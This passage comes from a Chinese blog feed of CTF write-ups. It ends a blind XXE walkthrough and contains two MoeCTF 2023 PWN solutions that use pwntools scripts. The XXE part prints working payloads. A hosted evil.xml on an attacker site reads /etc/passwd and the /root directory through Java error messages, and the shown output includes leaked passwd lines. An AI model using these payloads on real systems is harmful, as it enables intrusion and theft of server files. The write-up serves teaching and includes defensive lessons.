class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">unknown</span> protocol: root</span><br></pre></td></tr></table></figure><p>换句话说，在冒号<code>:</code>第一次出现之前，可以读取文件，但是读取冒号之后不能再读取了。绕过这一点并强制在错误消息中显示完整的文件内容的一种方法是在文件内容之前加上一个冒号。这将导致<code>no protocol</code>错误，因为第一个冒号之前的字段将是空的，即未定义。托管的 <code>evil.xml</code> 修改为:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">no <span class="symbol">protocol:</span> <span class="symbol">:root</span><span class="symbol">:x</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">[…]</span><br></pre></td></tr></table></figure><p>Java 在访问目录时还会返回目录列表，于是尝试访问根目录文件。</p><p>evil.xml</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///root&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">no protocol: :.bash_history</span><br><span class="line">.bash_logout</span><br><span class="line">.bash_profile</span><br><span class="line">.bashrc</span><br><span class="line">.pki</span><br><span class="line">.ssh</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>就是这样，看来我们很幸运。通过滥用不充分的网络分隔、未打补丁的内部应用程序服务器、过度特权的web服务器以及通过过于冗长的错误消息传递导致的信息泄漏，我们成功地将一个<code>blind XXE</code>漏洞提升为读取<code>root</code>目录和文件的漏洞。</p><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>红队：</p><ol><li>如果有东西看起来很奇怪，那么继续挖掘</li><li><code>Java SAX</code>解析器对<code>URL</code>模式的有趣处理允许使用一些新的方法提取信息。虽然现代<code>Java</code>版本不允许将多行文件作为外部HTTP请求(即<code>attacker.org/?&amp;file;</code>)的方式导出，但是在错误消息中，甚至在<code>URL</code>协议中，都可以获得多行响应</li></ol><p>蓝队：</p><ol><li>确保内部服务器和面向公众的服务器一样得到了及时的修补</li><li>不要把内部网络视为一个受信任的安全区，而应采用适当的网络分隔</li><li>将详细的错误消息写入错误日志，而不是HTTP响应</li><li>依赖身份验证并不一定能缓解诸如XXE之类的低级问题</li></ol><p><a href="https://www.cnblogs.com/heycomputer/articles/10263382.html">https://www.cnblogs.com/heycomputer/articles/10263382.html</a></p><hr><p>就这么多吧（抄别人的博客的作者是屑）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-File Descriptor</title>
      <link href="/2023/08/27/pwnfd/"/>
      <url>/2023/08/27/pwnfd/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/pwnfd1.PNG"><br><img src="/images/pwnfd2.PNG"><br><img src="/images/pwnfd3.PNG"><br>大概是要我们输入一个叫fd的东西来读取文件，也就是只要我们输入正确的fd就可以得到flag，那什么是fd呢？</p><p>FD，即“文件描述符”，以下是摘录于知乎的简述：</p><h2 id="fd是什么？"><a href="#fd是什么？" class="headerlink" title="fd是什么？"></a>fd是什么？</h2><p>fd是File descriptor的缩写，中文名叫做：文件描述符。文件描述符是一个非负整数，本质上是一个索引值（这句话非常重要）。</p><h2 id="什么时候拿到的fd？"><a href="#什么时候拿到的fd？" class="headerlink" title="什么时候拿到的fd？"></a>什么时候拿到的fd？</h2><p>当打开一个文件时，内核向进程返回一个文件描述符（ <code>open</code> 系统调用得到 ），后续 <code>read</code>、<code>write</code> 这个文件时，则只需要用这个文件描述符来标识该文件，将其作为参数传入 <code>read</code>、<code>write</code> 。</p><h2 id="fd-的值范围是什么？"><a href="#fd-的值范围是什么？" class="headerlink" title="fd 的值范围是什么？"></a>fd 的值范围是什么？</h2><p>在 POSIX 语义中，0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）。</p><p>文件描述符是有一个范围的：0 ～ OPEN_MAX-1 ，最早期的 UNIX 系统中范围很小，现在的主流系统单就这个值来说，变化范围是几乎不受限制的，只受到系统硬件配置和系统管理员配置的约束。</p><p>看完上面的介绍我们知道：</p><p>1.fd是一个非负整数<br>2.fd用来表示一个被程序打开的文件<br>3.fd中0，1，2已经被赋予特殊含义<br>4.fd可以非常大</p><p>一个想法从我心中诞生，是不是只要我从3开始一直试就能试出flag的fd。但问题又来了，如上面的图2和图3，当我向程序输入一个fd之后，程序会立即断开我的连接，这样会使我无法进行后面的穷举，该怎么办呢？很简单，那就再开一个连接，让我的脚本控制连接与中断，试完3就断开，然后开启新的连接试4，以此类推，把主动权掌握在自己手里。</p><h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><p>用python写脚本，并且请出我们的pwntools,写完后运行：<br><img src="/images/fdproblem.PNG"><br>如果我们只是这样尝试，一条一条回显的看，很容易错过flag，而且浪费宝贵时间，于是，我增加了匹配与flag相关字符串的代码，上网搜索的代码有些很复杂，其实只需要一个in就可以，当字符串匹配时会返回一个True布尔变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t = <span class="number">3</span></span><br><span class="line">check=<span class="string">&quot;moectf&quot;</span></span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;192.168.36.1&quot;</span>,<span class="string">&quot;50633&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>): </span><br><span class="line">        l = r.recvline() <span class="comment">#分行接受信息</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">3</span>: <span class="comment">#将整形变量转化为byte并发送</span></span><br><span class="line">            strt = <span class="built_in">str</span>(t)</span><br><span class="line">            r.sendline(strt.encode())</span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>: <span class="comment">#接受回显并检查</span></span><br><span class="line">            strl = <span class="built_in">str</span>(l)</span><br><span class="line">            <span class="built_in">print</span>(l)</span><br><span class="line">            <span class="keyword">if</span> check <span class="keyword">in</span> strl:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;get flag!&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>) <span class="comment">#得到flag后退出</span></span><br><span class="line">    <span class="built_in">print</span>(t）</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="comment">#time.sleep(1)</span></span><br></pre></td></tr></table></figure><p>输入执行，去泡杯茶吧<br><img src="/images/fdslove.PNG"><br>这次结束的很干净</p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.python中的字符串匹配可以用正则表达式和re，但在这题里in是很好的选择<br>2.善于转换思路，比如本题中将连接掌握在自己手里的操作<br>3.这种解法对网络资源的需求高，网络不好程序可能会慢，而且容器会断开连接</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-BabyCalculator</title>
      <link href="/2023/08/26/CTF1/"/>
      <url>/2023/08/26/CTF1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p><img src="/images/pwnlook1.PNG"><br><img src="/images/pwnlook2.PNG"><br>大概就是要我们写一个程序来和这个二进制程序交互，还要使用到pwntools这个工具。</p><h1 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h1><p>上网搜索了一下，pwntools是python的一个库，支持python3 使用pip安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip #升级pip，可以不执行 </span><br><span class="line">python3 -m pip install --upgrade pwntools #可能会升级pip，而且使用国外源，比较慢</span><br><span class="line">python3 -m pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/ #使用国内源，不更新pip，建议使用这条</span><br></pre></td></tr></table></figure><h1 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h1><p>稍微了解了一下pwntools的用法，基本够用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">send(data) <span class="comment">#发送数据</span></span><br><span class="line">sendline(data) <span class="comment">#发送一行数据，相当于在末尾加\n      </span></span><br><span class="line">recv(numb=<span class="number">4096</span>, timeout=default)  <span class="comment">#给出接收字节数,timeout指定超时</span></span><br><span class="line">recvuntil(<span class="string">&quot;hello,world\n&quot;</span>, drop=<span class="literal">False</span>) <span class="comment">#接收直到我们设置的标志出现</span></span><br><span class="line"><span class="comment">#（以下可以看作until的特例）</span></span><br><span class="line">recvline(keepends=<span class="literal">True</span>) <span class="comment">#接收到\n，keepends指定保留\n</span></span><br><span class="line">recvall() <span class="comment">#接收到EOF</span></span><br><span class="line">recvrepeat(timeout=default) <span class="comment">#接收到EOF或timeout</span></span><br><span class="line">interactive() <span class="comment">#与shell交互</span></span><br></pre></td></tr></table></figure><h1 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#引用库</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;192.168.36.1&quot;</span>,<span class="string">&quot;63551&quot;</span>) <span class="comment">#远程连接容器</span></span><br><span class="line">i = <span class="number">0</span>                    </span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">times = <span class="number">0</span></span><br><span class="line">win = <span class="string">&quot;BlackBird&quot;</span>        </span><br><span class="line">lose = <span class="string">&quot;WingS&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span> <span class="comment">#显示pwntools的debug输出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> t &lt; <span class="number">7</span>:</span><br><span class="line">    welcome = r.recvline() <span class="comment">#逐行接受欢迎信息</span></span><br><span class="line">    t = t + <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> times &lt; <span class="number">102</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">        line = r.recvline(keepends=<span class="literal">False</span>) <span class="comment">#逐行检查接受信息，并去掉行尾的\n </span></span><br><span class="line">        mystr = line.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="comment">#将接受到的byte类型字符转化为字符串</span></span><br><span class="line">        <span class="built_in">print</span>(mystr)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:   <span class="comment">#拆分给出的算式，判断答案，并将字符串转为byte并与容器交互</span></span><br><span class="line">            x = mystr.split(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">            a = <span class="built_in">int</span>(x[<span class="number">0</span>])</span><br><span class="line">            d = x[<span class="number">1</span>]</span><br><span class="line">            e = d.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">            b = <span class="built_in">int</span>(e[<span class="number">0</span>])</span><br><span class="line">            c = <span class="built_in">int</span>(e[<span class="number">1</span>])</span><br><span class="line">            con = a + b</span><br><span class="line">            <span class="keyword">if</span> con == c:</span><br><span class="line">                r.sendline(win.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="keyword">elif</span> con != c:</span><br><span class="line">                r.sendline(lose.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">    times = times + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>输入执行，得到flag<br><img src="/images/working.PNG"><br><img src="/images/getflag.PNG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.pwn题目的byte要用decode转化为字符串才能用split处理<br>2.与容器交互时也要将输入字符转为byte（有一些教程不用，或许都要试试？）<br>3.接受数据时采用recvline是因为当时不清楚recvuntil的用法，用recvuntil会更好</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
